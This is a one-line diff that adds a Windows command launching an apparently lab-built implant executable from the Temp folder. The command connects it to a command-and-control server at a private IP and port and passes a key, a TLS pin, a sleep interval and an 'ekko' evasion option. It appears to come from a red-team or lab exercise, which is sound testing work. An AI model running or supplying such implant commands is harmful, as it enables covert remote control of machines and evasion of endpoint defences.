@@ -1,0 +1,1 @@
+﻿"C:\Users\lab\AppData\Local\Temp\abraham-lab-implant.exe" --server 192.168.162.1:9443 --key 2bd4bd7ffed067eb149c25f85a54471cc28d73f0c2795b1eb9770426e74adab5 --tls-pin 7bfc00a2b1f9e5cdb2bf0888379f792833378304e945b100d0ec60258b59d2d3 --sleep 3 --evasion ekko 
